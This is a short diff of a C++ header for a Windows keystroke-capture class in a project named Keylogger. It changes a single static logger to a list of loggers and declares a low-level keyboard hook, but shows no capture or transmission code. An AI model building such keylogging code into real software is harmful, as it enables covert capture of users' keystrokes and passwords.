@@ -4,6 +4,7 @@
 #include "IKeystrokeCapturer.h"
 #include "ILogger.h"
 
+#include <vector>
 #include <windows.h>
 
 namespace Keylogger {
@@ -14,15 +15,15 @@ class KeystrokeCapturerWindows : public IKeystrokeCapturer {
     void stop();
 
     void consumeKeystrokes(bool consume);
-    void setLogger(ILogger* logger);
+    void addLogger(ILogger* logger);
 
  private:
+    //find a way to make these not static
+    static std::vector<ILogger*> _loggers;
     static bool _consumeKeystrokes;
+    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 
     HHOOK _keyboardHook;
-    static ILogger* _logger;
-
-    static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
 };
 
 }
